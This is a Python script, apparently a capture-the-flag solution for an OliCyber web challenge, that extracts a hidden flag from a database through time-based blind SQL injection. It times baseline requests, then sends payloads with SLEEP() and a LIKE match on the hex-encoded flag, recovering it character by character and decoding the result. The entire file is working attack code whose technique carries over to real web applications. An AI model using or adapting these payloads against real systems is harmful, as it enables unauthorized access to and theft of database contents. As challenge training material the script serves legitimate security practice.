import inj as Inj
import time as t
import codecs




inj = Inj.Inj('http://web-17.challs.olicyber.it/')

payload = '1 OR 1=1 -- '
response = inj.time(payload)
print(response)

def execute():
    response = inj.time(payload)
    return response

tries = 20
times = []

for i in range(20):
    start_time = t.time_ns()
    response = execute() # To generalize
    end_time = t.time_ns()
    time = end_time - start_time
    times.append(time)
    print(time)

avg_time_ns = sum(times) / tries
avg_time_s = avg_time_ns / 1_000_000_000
avg_time = f'{avg_time_ns} ns ({avg_time_s} s)'
print(f'Average time: {avg_time} ns')

delay = 3*avg_time_s
print(f'Using delay: {delay} s')

threshold = (delay+avg_time_s)/2
print(f'Using threshold: {threshold} s')


dictionary = "0123456789ABCDEF"
attempts = 0
length = 1
result = ""
found_char_flag = True

while found_char_flag:
    found_char_flag = False
    if attempts == len(dictionary):
        length += 1
        attempts = 0
    for c in dictionary:
        attempted_result = result+c
        secret_attempt = f'{attempted_result}%'
        payload = f"1' AND (SELECT SLEEP({delay}) FROM flags WHERE HEX('flag') LIKE '{secret_attempt}')='1"
        start_time = t.time_ns()
        response, error = inj.time(payload)
        end_time = t.time_ns()
        time = end_time - start_time
        time_s = time / 1_000_000_000
        print(f'Tried {attempted_result} in {time_s}s')
        if time_s >= threshold:
            result += c
            found_char_flag = True
            print(result)
            break
    attempts += 1

print(f"Found: {result}")
print(f"hex2str: {codecs.decode(result, 'hex').decode('utf-8')}")
